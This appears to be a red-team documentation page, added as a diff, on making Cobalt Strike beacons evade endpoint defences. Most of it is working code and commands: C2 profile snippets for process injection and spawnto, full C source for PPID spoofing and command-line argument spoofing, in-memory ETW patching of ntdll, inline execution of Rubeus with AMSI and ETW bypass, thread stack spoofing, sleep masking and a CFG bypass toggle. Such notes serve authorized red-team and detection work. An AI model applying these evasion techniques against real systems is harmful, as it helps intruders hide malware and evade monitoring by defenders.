@@ -1,0 +1,389 @@
+import { Tab, Tabs, Callout } from 'nextra-theme-docs'
+
+## Check your payloads
+- [**peclone**](https://github.com/tasooshi/peclone) ( use instead of `strings` to have a better look on the PE internals and its **IAT** )
+    ```bash copy filename="Bash"
+    peclone dump ./payload.exe
+    ```
+## Evasion Techniques
+### Basic Techniques 
+<Callout type="info" emoji="👻">
+These techniques doesn't depend on the circumestances of the environment. and should be prepared and enabled before any engagement.   
+</Callout>
+
+#### yscalls
+Can be enabled in 3 places:
+1. artifact kit
+2. C2 profile
+3. CS client
+### Variable Techniques 
+<Callout type="info" emoji="👻">
+These techniques depend on what you'll encounter in the engagement environment of different Defense techniques, for which you'll enable and customize the bypass techniques corresponding to each.
+</Callout>
+
+### Memory Permissions & Cleanup
+Add this snippet to c2 profile 
+```json copy showLineNumbers filename="c2.profile"
+stage {
+    # prevent the loader from using RWX for the beacon
+    set userwx "false";
+
+    # Remove the loader once the beacon is running
+    set cleanup "true";
+}
+```
+
+### BOF Memory Allocations
+Add the following snippet to c2 profile
+```json copy filename="c2.profile" showLineNumbers
+process-inject {
+    # Tells the beacon to allocate memory for BOF as RW
+    set startrwx "false";
+
+    # Tells the beacon to set the BOF memory to RX not RWX before executing the BOF
+    set userwx "false";
+
+    # Tells the beacon to free the memory allocated for  BOF after execution
+    set bof_reuse_memory "false";
+}
+```
+
+### Process Injection 
+<Callout type="info" emoji="👻">
+Take into consideration to inject into process's that your beacon's behaviour and network traffic can blend in with theirs     
+</Callout>
+- Enable it in Session Using `spawnto`
+
+```bash copy filename="beacon>"
+spawnto x64 %windir%\\sysnative\\dllhost.exe
+```
+- Enable it in c2 profile 
+
+Add the following snippet to c2 profile
+```json copy filename="c2.profile" showLineNumbers
+post-ex {
+    set spawnto_x86 "%windir%\\sysnative\\dllhost.exe";
+    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+}
+```
+
+- Process-Injection Manually
+By modifying the `process_inject_spawn.c` and `process_inject_explicit.c` in `C:\Tools\cobaltstrike\arsenal-kit\kits\process_inject` which controlls the 2 variants of process injection
+    1.  Build the scripts `./build.sh /mnt/c/Tools/cobaltstrike/custom-injection`
+    2.  Import the CNA aggressor profile in CobaltStrike 
+
+### PPID Spoofing
+- Using `ppid` 
+```bash copy filename="beacon>"
+ppid 5056
+```
+- PPID Spoofing Manually
+```cs copy {34} filename="PPID-Spoofer.c" showLineNumbers
+#include <Windows.h>
+#include <iostream>
+ 
+int main()
+{
+    const DWORD attributeCount = 1;
+ 
+    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
+    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);
+ 
+    SIZE_T lpSize = 0;
+ 
+    // call once to get lpSize
+    InitializeProcThreadAttributeList(
+        NULL,
+        attributeCount,
+        0,
+        &lpSize);
+ 
+    // allocate the memory
+    si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);
+ 
+    // call again to initialise the list
+    InitializeProcThreadAttributeList(
+        si->lpAttributeList,
+        attributeCount,
+        0,
+        &lpSize);
+ 
+    // open a handle to the desired parent
+    HANDLE hParent = OpenProcess(
+        PROCESS_CREATE_PROCESS,
+        FALSE,
+        5584); // hardcoded pid of parent process to inject under
+ 
+    // update the list
+    UpdateProcThreadAttribute(
+        si->lpAttributeList,
+        NULL,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent,
+        sizeof(HANDLE),
+        NULL,
+        NULL);
+ 
+    // create process
+    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+    wchar_t cmd[] = L"notepad.exe\0";
+ 
+    CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT,
+        NULL,
+        NULL,
+        &si->StartupInfo, 
+        pi);
+ 
+    // print the pid
+    printf("PID: %d\n", pi->dwProcessId);
+ 
+    // cleanup list and memory
+    DeleteProcThreadAttributeList(si->lpAttributeList);
+    free(si->lpAttributeList);
+ 
+    // close handle to parent
+    CloseHandle(hParent);
+}
+```
+
+### Command Line Argument Spoofing 
+- Using `argue`
+```bash copy filename="beacon>"
+argue ping -n 5 google.com
+```
+
+- Argument Spoofing Manually
+```cs copy filename="argument-spoofer.c" {60} showLineNumbers
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+ 
+typedef NTSTATUS(*NtQueryInformationProcess2)(
+	IN HANDLE,
+	IN PROCESSINFOCLASS,
+	OUT PVOID,
+	IN ULONG,
+	OUT PULONG
+	);
+ 
+void* readProcessMemory(HANDLE process, void* address, DWORD bytes) {
+	SIZE_T bytesRead;
+	char* alloc;
+ 
+	alloc = (char*)malloc(bytes);
+	if (alloc == NULL) {
+		return NULL;
+	}
+ 
+	if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
+		free(alloc);
+		return NULL;
+	}
+ 
+	return alloc;
+}
+ 
+BOOL writeProcessMemory(HANDLE process, void* address, void* data, DWORD bytes) {
+	SIZE_T bytesWritten;
+ 
+	if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
+		return false;
+	}
+ 
+	return true;
+}
+ 
+int main(int argc, char** canttrustthis)
+{
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	CONTEXT context;
+	BOOL success;
+	PROCESS_BASIC_INFORMATION pbi;
+	DWORD retLen;
+	SIZE_T bytesRead;
+	PEB pebLocal;
+	RTL_USER_PROCESS_PARAMETERS* parameters;
+ 
+	printf("Argument Spoofing Example by @_xpn_\n\n");
+ 
+	memset(&si, 0, sizeof(si));
+	memset(&pi, 0, sizeof(pi));
+ 
+	// Start process suspended
+	success = CreateProcessA(
+		NULL,
+		(LPSTR)"powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'",
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
+		NULL,
+		"C:\\Windows\\System32\\",
+		&si,
+		&pi);
+ 
+	if (success == FALSE) {
+		printf("[!] Error: Could not call CreateProcess\n");
+		return 1;
+	}
+ 
+	// Retrieve information on PEB location in process
+	NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
+	ntpi(
+		pi.hProcess,
+		ProcessBasicInformation,
+		&pbi,
+		sizeof(pbi),
+		&retLen
+	);
+ 
+	// Read the PEB from the target process
+	success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
+	if (success == FALSE) {
+		printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
+		return 1;
+	}
+ 
+	// Grab the ProcessParameters from PEB
+	parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
+		pi.hProcess,
+		pebLocal.ProcessParameters,
+		sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
+	);
+ 
+	// Set the actual arguments we are looking to use
+	WCHAR spoofed[] = L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0";
+	success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
+	if (success == FALSE) {
+		printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
+		return 1;
+	}
+ 
+	/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////
+ 
+	// Update the CommandLine length (Remember, UNICODE length here)
+	DWORD newUnicodeLen = 28;
+ 
+	success = writeProcessMemory(
+		pi.hProcess,
+		(char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
+		(void*)&newUnicodeLen,
+		4
+	);
+	if (success == FALSE) {
+		printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
+		return 1;
+	}
+ 
+	// Resume thread execution*/
+	ResumeThread(pi.hThread);
+}
+```
+
+### Image Load Events 
+Choose binaries to `spawnto` that are likely to load the DLL files you're post-ex capabilities will load, as a reference `msiexec.exe` loads `System.Management.Automation.dll` which is loaded by `powerpick`, so we can `spawnto` it before using `powerpick`.
+```bash copy filename="beacon>" showLineNumbers 
+spawnto x64 %windir%\sysnative\msiexec.exe
+```
+
+### Tool Signatures
+Try to alter and rebuild your tools to bypass static analysis and change the tool Signature
+
+### SMB Named Pipe Names 
+Replace default CobaltStrike pipenames for the by adding the following snippet to our c2 profile
+```json copy showLineNumbers filename="c2.profile"
+post-ex {
+        # put a list of names separated by comma, use #### for randomization
+        set pipename "totally_not_beacon, legitPipe_##";
+}
+```
+
+### ETW
+- Bypass in session
+    Can be bypassed by patching `ntdll.dll` in memory while executing `execute-assembly` and `powerpick`
+    ```powershell filename="beacon>" showLineNumbers copy
+    execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+    ```
+- Configure it into c2 profile
+    ```json copy filename="c2.profile" showLineNumbers /bexecute_assembly/
+    alias powerpick-patched {
+    # Also can be configuere it for execute-assembly via bexecute_assembly function
+    bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
+    }
+    ```
+
+### Inline (.NET) Execution
+Execute assemblies within the beacon process without **fork & run**
+```bash filename="beacon>" copy 
+inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
+```
+
+### Thread Stack Spoofing 
+We need to build our artifacts with the `thread stack spoofing` option enabled 
+![stack spoof](/images/stack-spoof-1.png)
+```bash copy filename="Bash"
+./build.sh "pipe" MapViewOfFile 296948 0 true true none /mnt/c/Tools/cobaltstrike/artifacts
+```
+Can be tested by
+```powershell copy filename="Powershell"
+ C:\Tools\Hunt-Sleeping-Beacons\Hunt-Sleeping-Beacons.exe
+```
+
+### Sleep Mask 
+We can make the beacon obfuscate its memory while sleeping with **Sleep Mask Kit** 
+1. Build the **sleep mask kit**
+    ```bash copy filename="Bash"
+    ./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
+    ```
+2. Add the following to the **Stage** block in our c2 profile 
+    ```json copy filename="c2-profile"
+    set sleep_mask "true";
+    ```
+3. Load the **CNA** in Cobalt Strike 
+    
+### Sleep Mask & Thread Stack Spoofing 
+Normally both are not compatible with each other, but we can solve this by:
+1. Enable evasive sleep stackspoof in `sleep.c`
+    1. Set 
+        ```cpp copy filename="sleep.c"
+        #define EVASIVE_SLEEP 1`.
+        ```
+    2. Comment out the line 
+        ```cpp copy filename="sleep.c"
+        #include "evasive_sleep.c"
+        ```
+        and uncomment the line 
+        ```cpp copy filename="sleep.c"
+        #include "evasive_sleep_stack_spoof.c"
+        ```
+2. Spoof a thread stack from the system 
+    1. Using **Process Hacker** we shuold find a process with a thread stack that starts with `NtWaitForSingleObject`, these are some processes with what  we're looking for
+        
+        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-1.png)
+    2. Using **getFunctionOffset.exe** we should get the offset of these methods from the DLL files on that target system, as an example, you can spoof the stack of **conhost.exe** by
+        ```powershell copy filename="Powershell"
+        getFunctionOffset.exe KernelBase DeviceIoControl 0x86
+        getFunctionOffset.exe kernel32 DeviceIoControl 0x81
+        getFunctionOffset.exe kernel32 BaseThreadInitThunk 0x14
+        getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
+        ```
+    3. Copy the generated code into set_callstack (replacing the example lines that were already there).
+        ![evasive-sleep-stack-spoof](/images/evasive-sleep-stack-spoof-2.png)
+        <Callout type="info" emoji="👻">
+        Note that you don't need to include the call to `NtWaitForSingleObject`.    
+        </Callout>
+
+    4. Rebuild the artifact-kit and load the `cna` file into CobaltStrike
+3. Beacons injected in binaries with **CFG (Control Flow Guard)** can't be **evasive sleep** enabled. but there is a bypass to that within `evasive_sleep_stack_spoof.c` which can be easily enabled by flipping the option definition to `1`
+    ```cpp copy filename="evasive_sleep_stack_spoof.c"
+    #define CFG_BYPASS 1
+    ```
+
+
